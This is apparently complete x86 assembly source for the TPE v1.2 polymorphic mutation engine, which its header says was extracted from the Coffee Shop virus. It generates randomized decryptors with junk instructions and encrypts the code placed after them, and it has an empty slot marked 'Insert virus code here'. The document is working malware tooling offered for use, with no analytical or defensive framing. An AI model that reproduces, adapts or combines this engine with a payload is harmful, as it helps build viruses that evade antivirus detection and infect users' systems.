                .radix  16

;-----------------------------------------------------------------------------
;
;                            TPE v1.2 Source Code
;                            --------------------
;
;  Extracted from Coffee Shop virus by: Lucifer Messiah -- ANARKICK SYSTEMS
;
;-----------------------------------------------------------------------------

                .model  tiny
                .code

public          rnd_init
public          rnd_get
public          crypt
public          tpe_bottom
public          tpe_top

;****************************************************************************
;*               Data area for engine
;****************************************************************************

                org     0e0
TPE12:

add_val         dw      0
xor_val         dw      0
xor_offset      dw      0
where_len       dw      0
where_len2      dw      0
flags           db      0


;****************************************************************************
;*              Begin of virus, installation in memory
;****************************************************************************

                org     0100

;****************************************************************************
;*            Insert virus code here, or compile and link to virus
;****************************************************************************






;****************************************************************************
;*
;*              Encryption Engine
;*
;*
;*      Input:  ES      work segment
;*              DS:DX   code to encrypt
;*              BP      what will be start of decryptor
;*              SI      what will be distance between decryptor and code
;*              CX      length of code
;*              AX      flags: bit 0: DS will not be equal to CS
;*                             bit 1: insert random instructions
;*                             bit 2: put junk before decryptor
;*                             bit 3: preserve AX with decryptor
;*
;*      Output: ES:     work segment (preserved)
;*              DS:DX   decryptor + encrypted code
;*              BP      what will be start of decryptor (preserved)
;*              DI      length of decryptor / offset of encrypted code
;*              CX      length of decryptor + encrypted code
;*              AX      length of encrypted code
;*              (other registers may be trashed)
;*
;****************************************************************************

tpe_top         equ     $
                db      '[ MK / Trident ]'

crypt:
                xor     di,di                   ;di = start of decryptor
                push    dx                      ;save offset of code
                push    si                      ;save future offset of code

                mov     byte ptr ds:[flags],al  ;save flags
                test    al,8                    ;push  AX?
                jz      no_push
                mov     al,50
                stosb

no_push:        call    rnd_get                 ;add a few bytes to cx
                and     ax,1F
                add     cx,ax
                push    cx                      ;save length of code

                call    rnd_get                 ;get random flags
                xchg    ax,bx
                                        ;BX flags:

                                        ;0,1    how to encrypt
                                        ;2,3    which register for encryption
                                        ;4      use byte or word for encrypt
                                        ;5      MOV AL, MOV AH or MOV AX
                                        ;6      MOV CL, MOV CH or MOV CX
                                        ;7      AX or DX

                                        ;8      count up or down
                                        ;9      ADD/SUB/INC/DEC or CMPSW/SCASW
                                        ;A      ADD/SUB or INC/DEC
                                        ;       CMPSW or SCASW
                                        ;B      offset in XOR instruction?
                                        ;C      LOOPNZ or LOOP
                                        ;       SUB CX or DEC CX
                                        ;D      carry with crypt ADD/SUB
                                        ;E      carry with inc ADD/SUB
                                        ;F      XOR instruction value or AX/DX

random:         call    rnd_get                 ;get random encryption value
                or      al,al
                jz      random                  ;again if 0
                mov     ds:[xor_val],ax

                call    do_junk                 ;insert random instructions

                pop     cx

                mov     ax,0111                 ;make flags to remember which
                test    bl,20                   ;  MOV instructions are used
                jnz     z0
                xor     al,07
z0:             test    bl,0C
                jnz     z1
                xor     al,70
z1:             test    bl,40
                jnz     z2
                xor     ah,7
z2:             test    bl,10
                jnz     z3
                and     al,73
z3:             test    bh,80
                jnz     z4
                and     al,70

z4:             mov     dx,ax
mov_lup:        call    rnd_get                 ;put MOV instructions in
                and     ax,000F                 ;  a random order
                cmp     al,0A
                ja      mov_lup

                mov     si,ax
                push    cx                      ;test if MOV already done
                xchg    ax,cx
                mov     ax,1
                shl     ax,cl
                mov     cx,ax
                and     cx,dx
                pop     cx
                jz      mov_lup
                xor     dx,ax                   ;remember which MOV done

                push    dx
                call    do_mov                  ;insert MOV instruction
                call    do_nop                  ;insert a random NOP
                pop     dx

                or      dx,dx                   ;all MOVs done?
                jnz     mov_lup

                push    di                      ;save start of decryptor loop

                call    do_add_ax               ;add a value to AX in loop?
                call    do_nop
                test    bh,20                   ;carry with ADD/SUB ?
                jz      no_clc
                mov     al,0F8
                stosb
no_clc:         mov     word ptr ds:[xor_offset],0
                call    do_xor                  ;place all loop instructions
                call    do_nop
                call    do_add

                pop     dx                      ;get start of decryptor loop

                call    do_loop

                test    byte ptr ds:[flags],8   ;insert POP AX ?
                jz      no_pop
                mov     al,58
                stosb

no_pop:         xor     ax,ax                   ;calculate loop offset
                test    bh,1                    ;up or down?
                jz      v1
                mov     ax,cx
                dec     ax
                test    bl,10                   ;encrypt with byte or word?
                jz      v1
                and     al,0FE
v1:             add     ax,di
                add     ax,bp
                pop     si
                add     ax,si
                sub     ax,word ptr ds:[xor_offset]
                mov     si,word ptr ds:[where_len]
                test    bl,0C                   ;are BL,BH used for encryption?
                jnz     v2
                mov     byte ptr es:[si],al
                mov     si,word ptr ds:[where_len2]
                mov     byte ptr es:[si],ah
                jmp     short v3
v2:             mov     word ptr es:[si],ax

v3:             mov     dx,word ptr ds:[xor_val]   ;encryption value

                pop     si                      ;ds:si = start of code

                push    di                      ;save ptr to encrypted code
                push    cx                      ;save length of encrypted code

                test    bl,10                   ;byte or word?
                jz      blup

                inc     cx                      ;cx = # of crypts (words)
                shr     cx,1

lup:            lodsw                           ;encrypt code (words)
                call    do_encrypt
                stosw
                loop    lup
                jmp     short klaar


blup:           lodsb                           ;encrypt code (bytes)
                xor     dh,dh
                call    do_encrypt
                stosb
                loop    blup

klaar:          mov     cx,di                   ;cx = length decryptpr + code
                pop     ax                      ;ax = length of decrypted code
                pop     di                      ;di = offset encrypted code
                xor     dx,dx                   ;ds:dx = decryptor + cr. code
                push    es
                pop     ds
                ret


;****************************************************************************
;*              encrypt the code
;****************************************************************************

do_encrypt:     add     dx,word ptr ds:[add_val]
                test    bl,2
                jnz     lup1
                xor     ax,dx
                ret

lup1:           test    bl,1
                jnz     lup2
                sub     ax,dx
                ret

lup2:           add     ax,dx
                ret


;****************************************************************************
;*              generate mov reg,xxxx
;****************************************************************************

do_mov:         mov     dx,si
                mov     al,byte ptr ds:[si+mov_byte]
                cmp     dl,4                    ;BX?
                jne     is_not_bx
                call    add_ind
is_not_bx:      test    dl,0C                   ;A*?
                pushf
                jnz     is_not_a
                test    bl,80                   ;A* or D*?
                jz      is_not_a
                add     al,2

is_not_a:       call    alter                   ;insert the MOV

                popf                            ;A*?
                jnz     is_not_a2
                mov     ax,word ptr ds:[xor_val]
                jmp     short sss

is_not_a2:      test    dl,8                    ;B*?
                jnz     is_not_b
                mov     si,offset where_len                
                test    dl,2
                jz      is_not_bh
                add     si,2
is_not_bh:      mov     word ptr ds:[si],di
                jmp     short sss

is_not_b:       mov     ax,cx                   ;C*
                test    bl,10                   ;byte or word encryption?
                jz      sss
                inc     ax                      ;only half the number of bytes
                shr     ax,1
sss:            test    dl,3                    ;byte or word register?
                jz      is_x
                test    dl,2                    ;*H?
                jz      is_not_h
                xchg    al,ah
is_not_h:       stosb
                ret

is_x:           stosw
                ret


;****************************************************************************
;*              insert MOV or alternative for MOV
;****************************************************************************

alter:          push    bx
                push    cx
                push    ax
                call    rnd_get
                xchg    ax,bx
                pop     ax
                test    bl,3                    ;use alternative for MOV?
                jz      no_alter

                push    ax
                and     bx,0F
                and     al,08
                shl     ax,1
                or      bx,ax
                pop     ax

                and     al,7
                mov     cl,9
                xchg    ax,cx
                mul     cl

                add     ax,30C0
                xchg    al,ah
                test    bl,4
                jz      no_sub
                mov     al,28
no_sub:         call    maybe_2
                stosw

                mov     al,80
                call    maybe_2
                stosb

                mov     ax,offset add_mode
                xchg    ax,bx
                and     ax,3
                xlat

                add     al,cl
no_alter:       stosb
                pop     cx
                pop     bx
                ret


;****************************************************************************
;*              insert ADD AX,xxxx
;****************************************************************************

do_add_ax:      push    cx
                mov     si,offset add_val       ;save add-value here
                mov     word ptr ds:[si],0
                mov     ax,bx
                and     ax,8110
                xor     ax,8010
                jnz     no_add_ax               ;use ADD?

                mov     ax,bx
                xor     ah,ah
                mov     cl,3
                div     cl
                or      ah,ah
                jnz     no_add_ax               ;use ADD?

                test    bl,80
                jnz     do_81C2                 ;AX or DX?
                mov     al,5
                stosb
                jmp     short do_add0
do_81C2:        mov     ax,0C281
                stosw
do_add0:        call    rnd_get
                mov     word ptr ds:[si],ax
                stosw
no_add_ax:      pop     cx
                ret


;****************************************************************************
;*              generate encryption command
;****************************************************************************

do_xor:         test    byte ptr ds:[flags],1
                jz      no_cs
                mov     al,2E                   ;insert CS: instruction
                stosb

no_cs:          test    bh,80                   ;type of XOR command
                jz      xor1

                call    get_xor                 ;encrypt with register
                call    do_carry
                call    save_it
                xor     ax,ax
                test    bl,80
                jz      xxxx
                add     al,10
xxxx:           call    add_dir
                test    bh,8
                jnz     yyyy
                stosb
                ret

yyyy:           or      al,80
                stosb             
                call    rnd_get
                stosw
                mov     word ptr ds:[xor_offset],ax
                ret

xor1:           mov     al,080                  ;encrypt with value
                call    save_it
                call    get_xor
                call    do_carry
                call    xxxx
                mov     ax,word ptr ds:[xor_val]
                test    bl,10
                jmp     byte_word


;****************************************************************************
;*              generate increase/decrease command
;****************************************************************************

do_add:         test    bl,8                    ;no CMPSW/SCASW if BX is used
                jz      da0
                test    bh,2                    ;ADD/SUB/INC/DEC or CMPSW/SCASW
                jnz     do_cmpsw

da0:            test    bh,4                    ;ADD/SUB or INC/DEC?
                jz      add1

                mov     al,40                   ;INC/DEC
                test    bh,1                    ;up or down?
                jz      add0
                add     al,8
add0:           call    add_ind
                stosb
                test    bl,10                   ;byte or word?
                jz      return
                stosb                           ;same instruction again
return:         ret

add1:           test    bh,40                   ;ADD/SUB
                jz      no_clc2                 ;carry?
                mov     al,0F8                  ;insert CLC
                stosb
no_clc2:        mov     al,083
                stosb
                mov     al,0C0
                test    bh,1                    ;up or down?
                jz      add2
                mov     al,0E8
add2:           test    bh,40                   ;carry?
                jz      no_ac2
                and     al,0CF
                or      al,10
no_ac2:         call    add_ind
                stosb
                mov     al,1                    ;value to add/sub
save_it:        call    add_1
                stosb
                ret

do_cmpsw:       test    bh,1                    ;up or down?
                jz      no_std
                mov     al,0FDh                 ;insert STD
                stosb
no_std:         test    bh,4                    ;CMPSW or SCASW?
                jz      normal_cmpsw
                test    bl,4                    ;no SCASW if SI is used
                jnz     do_scasw

normal_cmpsw:   mov     al,0A6                  ;CMPSB
                jmp     short save_it
do_scasw:       mov     al,0AE                  ;SCASB
                jmp     short save_it


;****************************************************************************
;*              generate loop command
;****************************************************************************

do_loop:        test    bh,1                    ;no JNE if couting down
                jnz     loop_loop               ;  (prefetch bug!)
                call    rnd_get
                test    al,1                    ;LOOPNZ/LOOP or JNE?
                jnz     cx_loop

loop_loop:      mov     al,0E0
                test    bh,1A                   ;LOOPNZ or LOOP?
                jz      ll0                     ;  no LOOPNZ if xor-offset
                add     al,2                    ;  no LOOPNZ if CMPSW/SCASW
ll0:            stosb
                mov     ax,dx
                sub     ax,di
                dec     ax
                stosb
                ret

cx_loop:        test    bh,10                   ;SUB CX or DEC CX?
                jnz     cxl_dec
                mov     ax,0E983
                stosw
                mov     al,1
                stosb
                jmp     short do_jne                

cxl_dec:        mov     al,49
                stosb
do_jne:         mov     al,75
                jmp     short ll0


;****************************************************************************
;*              add value to AL depending on register type
;****************************************************************************

add_dir:        mov     si,offset dir_change
                jmp     short xx1

add_ind:        mov     si,offset ind_change
xx1:            push    bx
                shr     bl,1
                shr     bl,1
                and     bx,3
                add     al,byte ptr ds:[bx+si]
                pop     bx
                ret


;****************************************************************************
;*              mov encryption command byte to AL
;****************************************************************************

get_xor:        push    bx
                mov     ax,offset how_mode
                xchg    ax,bx
                and     ax,3
                xlat
                pop     bx
                ret


;****************************************************************************
;*              change ADD into ADC
;****************************************************************************

do_carry:       test    bl,2                    ;ADD/SUB used for encryption?
                jz      no_ac
                test    bh,20                   ;carry with (encr.) ADD/SUB?
                jz      no_ac
                and     al,0CF
                or      al,10
no_ac:          ret


;****************************************************************************
;*              change AL (byte/word)
;****************************************************************************

add_1:          test    bl,10
                jz      add_1_ret
                inc     al
add_1_ret:      ret


;****************************************************************************
;*              change AL (byte/word)
;****************************************************************************

maybe_2:        call    add_1
                cmp     al,81                   ;can't touch this
                je      maybe_not
                push    ax
                call    rnd_get
                test    al,1
                pop     ax
                jz      maybe_not
                add     al,2
maybe_not:      ret


;****************************************************************************
;*              get random nop (or not)
;****************************************************************************

do_nop:         test    byte ptr ds:[flags],2
                jz      no_nop
yes_nop:        call    rnd_get
                test    al,3
                jz      nop8
                test    al,2
                jz      nop16
                test    al,1
                jz      nop16x
no_nop:         ret


;****************************************************************************
;*              Insert random instructions
;****************************************************************************

do_junk:        test    byte ptr ds:[flags],4
                jz      no_junk
                call    rnd_get                 ;put a random number of
                and     ax,0F                   ;  dummy instructions before
                inc     ax                      ;  decryptor
                xchg    ax,cx
junk_loop:      call    junk
                loop    junk_loop
no_junk:        ret


;****************************************************************************
;*              get rough random nop (may affect register values)
;****************************************************************************

junk:           call    rnd_get
                and     ax,1E
                jmp     short aa0
nop16x:         call    rnd_get
                and     ax,06
aa0:            xchg    ax,si
                call    rnd_get
                jmp     word ptr ds:[si+junkcals]


;****************************************************************************
;*              NOP and junk addresses
;****************************************************************************

junkcals        dw      offset nop16x0
                dw      offset nop16x1
                dw      offset nop16x2
                dw      offset nop16x3
                dw      offset nop8
                dw      offset nop16
                dw      offset junk6
                dw      offset junk7
                dw      offset junk8
                dw      offset junk9
                dw      offset junkA
                dw      offset junkB
                dw      offset junkC
                dw      offset junkD
                dw      offset junkE
                dw      offset junkF


;****************************************************************************
;*              NOP and junk routines
;****************************************************************************

nop16x0:        and     ax,000F                 ;J* 0000 (conditional)
                or      al,70
                stosw
                ret


nop16x1:        mov     al,0EBh                 ;JMP xxxx / junk
                and     ah,07
                inc     ah
                stosw
                xchg    al,ah                   ;get lenght of bullshit
                cbw
                jmp     fill_bullshit


nop16x2:        call    junkD                   ;XCHG AX,reg / XCHG AX,reg
                stosb
                ret


nop16x3:        call    junkF                   ;INC / DEC or DEC / INC
                xor     al,8
                stosb
                ret


nop8:           push    bx                      ;8-bit NOP
                and     al,7
                mov     bx,offset nop_data8
                xlat
                stosb
                pop     bx
                ret


nop16:          push    bx                      ;16-bit NOP
                and     ax,0303
                mov     bx,offset nop_data16
                xlat
                add     al,ah
                stosb
                call    rnd_get
                and     al,7
                mov     bl,9
                mul     bl
                add     al,0C0
                stosb
                pop     bx
                ret


junk6:          push    cx                      ;CALL xxxx / junk / POP reg
                mov     al,0E8
                and     ah,0F
                inc     ah
                stosw
                xor     al,al
                stosb
                xchg    al,ah
                call    fill_bullshit
                call    do_nop
                call    rnd_get                 ;insert POP reg
                and     al,7
                call    no_sp
                mov     cx,ax
                or      al,58
                stosb

                test    ch,3                    ;more?
                jnz     junk6_ret

                call    do_nop
                mov     ax,0F087                ;insert XCHG SI,reg
                or      ah,cl
                test    ch,8
                jz      j6_1
                mov     al,8Bh
j6_1:           stosw

                call    do_nop
                push    bx
                call    rnd_get
                xchg    ax,bx
                and     bx,0F7FBh               ;insert XOR [SI],xxxx
                or      bl,8
                call    do_xor
                pop     bx
junk6_ret:      pop     cx
                ret


junk7:          and     al,0F                   ;MOV reg,xxxx
                or      al,0B0
                call    no_sp
                stosb
                test    al,8
                pushf
                call    rnd_get
                popf
                jmp     short byte_word


junk8:          and     ah,39                   ;DO r/m,r(8/16)
                or      al,0C0
                call    no_sp
                xchg    al,ah
                stosw
                ret


junk9:          and     al,3Bh                  ;DO r(8/16),r/m
                or      al,2
                and     ah,3F
                call    no_sp2
                call    no_bp
                stosw
                ret


junkA:          and     ah,1                    ;DO rm,xxxx
                or      ax,80C0
                call    no_sp
                xchg    al,ah       
                stosw
                test    al,1
                pushf
                call    rnd_get
                popf
                jmp     short byte_word


junkB:          call    nop8                    ;NOP / LOOP
                mov     ax,0FDE2
                stosw
                ret


junkC:          and     al,09                   ;CMPS* or SCAS*
                test    ah,1
                jz      mov_test
                or      al,0A6
                stosb
                ret
mov_test:       or      al,0A0                  ;MOV AX,[xxxx] or TEST AX,xxxx
                stosb
                cmp     al,0A8
                pushf
                call    rnd_get
                popf
                jmp     short byte_word


junkD:          and     al,07                   ;XCHG AX,reg
                or      al,90
                call    no_sp
                stosb
                ret


junkE:          and     ah,07                   ;PUSH reg / POP reg
                or      ah,50
                mov     al,ah
                or      ah,08
                stosw
                ret


junkF:          and     al,0F                   ;INC / DEC
                or      al,40
                call    no_sp
                stosb
                ret


;****************************************************************************
;*              store a byte or a word
;****************************************************************************

byte_word:      jz      only_byte
                stosw
                ret

only_byte:      stosb
                ret


;****************************************************************************
;*              don't fuck with SP!
;****************************************************************************

no_sp:          push    ax
                and     al,7
                cmp     al,4
                pop     ax
                jnz     no_sp_ret
                and     al,0FBh
no_sp_ret:      ret


;****************************************************************************
;*              don't fuck with SP!
;****************************************************************************

no_sp2:         push    ax
                and     ah,38
                cmp     ah,20
                pop     ax
                jnz     no_sp2_ret
                xor     ah,20
no_sp2_ret:     ret


;****************************************************************************
;*              don't use [BP+..]
;****************************************************************************

no_bp:          test    ah,4
                jnz     no_bp2
                and     ah,0FDh
                ret

no_bp2:         push    ax
                and     ah,7
                cmp     ah,6
                pop     ax
                jnz     no_bp_ret
                or      ah,1
no_bp_ret:      ret


;****************************************************************************
;*              write byte for JMP/CALL and fill with random bullshit
;****************************************************************************

fill_bullshit:  push    cx
                xchg    ax,cx
bull_lup:       call    rnd_get
                stosb
                loop    bull_lup
                pop     cx
                ret


;****************************************************************************
;*              random number generator  (stolen from 'Bomber')
;****************************************************************************

rnd_init:       push    cx
                call    rnd_init0               ;init
                and     ax,000F
                inc     ax
                xchg    ax,cx
random_lup:     call    rnd_get                 ;call random routine a few
                loop    random_lup              ;  times to 'warm up'
                pop     cx
                ret

rnd_init0:      push    dx                      ;initialize generator
                push    cx
                mov     ah,2C
                int     21
                in      al,40
                mov     ah,al
                in      al,40
                xor     ax,cx
                xor     dx,ax
                jmp     short move_rnd

rnd_get:        push    dx                      ;calculate a random number
                push    cx
                push    bx
                mov     ax,0                    ;will be: mov ax,xxxx
                mov     dx,0                    ;  and mov dx,xxxx
                mov     cx,7
rnd_lup:        shl     ax,1
                rcl     dx,1
                mov     bl,al
                xor     bl,dh
                jns     rnd_l2
                inc     al
rnd_l2:         loop    rnd_lup
                pop     bx

move_rnd:       mov     word ptr ds:[rnd_get+4],ax
                mov     word ptr ds:[rnd_get+7],dx
                mov     al,dl
                pop     cx
                pop     dx
                ret


;****************************************************************************
;*              tables for engine
;****************************************************************************

                ;       AX   AL   AH      (BX) BL   BH      CX   CL   CH
mov_byte        db      0B8, 0B0, 0B4, 0, 0B8, 0B3, 0B7, 0, 0B9, 0B1, 0B5

                ;       nop clc  stc  cmc  cli  cld incbp decbp
nop_data8       db      90, 0F8, 0F9, 0F5, 0FA, 0FC, 45,  4Dh

                ;      or and xchg mov
nop_data16      db      8, 20, 84, 88

                ;     bl/bh, bx, si  di
dir_change      db      07, 07, 04, 05
ind_change      db      03, 03, 06, 07


                ;       xor xor add sub
how_mode        db      30, 30, 00, 28

                ;       ?  add  xor  or
add_mode        db      0, 0C8, 0F0, 0C0

tpe_bottom      equ     $

                end     TPE12
